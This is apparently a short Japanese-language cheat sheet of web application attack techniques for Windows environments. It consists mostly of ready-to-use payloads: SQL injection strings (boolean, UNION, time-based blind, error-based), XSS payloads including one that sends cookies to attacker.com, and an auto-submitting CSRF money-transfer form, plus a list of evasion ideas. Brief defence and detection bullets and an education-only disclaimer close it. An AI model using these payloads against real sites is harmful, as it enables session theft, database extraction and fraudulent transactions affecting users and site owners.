# Windows Web Application Attack Techniques

**対応OS**: Windows

## 概要
Windows環境でのWebアプリケーションに対する攻撃手法について解説します。

## 基本的な手法

### SQLインジェクション
```sql
-- 基本的なSQLインジェクション
' OR '1'='1

-- ユニオンベースのSQLインジェクション
' UNION SELECT NULL,NULL,NULL--

-- 時間ベースのブラインドSQLインジェクション
'; IF (SELECT COUNT(*) FROM users WHERE username='admin')>0 WAITFOR DELAY '0:0:5'--

-- エラーベースのSQLインジェクション
' AND 1=CONVERT(int,(SELECT @@version))--
```

### XSS (クロスサイトスクリプティング)
```javascript
// 反射型XSS
<script>alert(document.cookie)</script>

// 格納型XSS
<img src="x" onerror="fetch('http://attacker.com/steal?cookie='+document.cookie)">

// DOM based XSS
<script>
document.write("<input value='"+location.hash.slice(1)+"'>");
</script>
```

### CSRF (クロスサイトリクエストフォージェリ)
```html
<!-- 自動送信フォーム -->
<form action="http://target.com/transfer" method="POST" id="csrf-form">
    <input type="hidden" name="amount" value="1000">
    <input type="hidden" name="to" value="attacker">
</form>
<script>document.getElementById("csrf-form").submit();</script>
```

## 検知回避テクニック
- エンコーディングの使用
- WAFバイパス
- 難読化
- タイミング制御

## 防御策
- 入力検証
- 出力エスケープ
- CSRFトークン
- セキュリティヘッダー

## 検知方法
- WAFログ分析
- 異常なリクエストパターン
- トラフィック監視
- エラーログ分析

## 注意事項
- このテクニックは教育目的でのみ使用してください
- 実環境での使用は法的責任を伴う可能性があります
- すべてのテストは許可された環境でのみ行ってください 